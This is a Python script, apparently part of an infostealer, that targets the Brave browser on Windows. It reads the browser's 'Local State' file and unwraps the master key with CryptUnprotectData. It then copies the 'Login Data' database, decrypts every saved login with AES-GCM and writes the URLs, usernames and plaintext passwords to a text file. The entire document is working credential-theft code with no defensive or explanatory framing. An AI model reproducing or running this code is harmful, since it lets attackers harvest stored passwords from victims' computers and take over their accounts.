import os
import json
import shutil
import base64
import sqlite3
from zipfile import ZipFile
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta

class Brave:
    def __init__(self):
        self._user_data = os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data"
        self._master_key = self._get_master_key()

    def _get_master_key(self):
        with open(self._user_data + "\\Local State", "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    @staticmethod
    def _decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return str(e)

    @staticmethod
    def _convert_time(time):
        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
        code_stamp = epoch + timedelta(microseconds=time)
        return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')

    def passwords(self):
        try:
            login_db = self._user_data + "\\Default\\Login Data"
            login_db_copy = os.getenv("TEMP") + "\\Login.db"
            shutil.copy2(login_db, login_db_copy)
            conn = sqlite3.connect(login_db_copy)
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                with open("brave_passwords.txt", "w", encoding="utf-8") as f:
                    for item in cursor.fetchall():
                        url = item[0]
                        username = item[1]
                        encrypted_password = item[2]
                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
                        f.write(f"URL: {url}\nUSR: {username}\nPDW: {decrypted_password}\n\n")

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(login_db_copy)
        except Exception as e:
            print(f"[!]Error: {e}")

            
if __name__ == "__main__":
    brave = Brave()
    brave.passwords()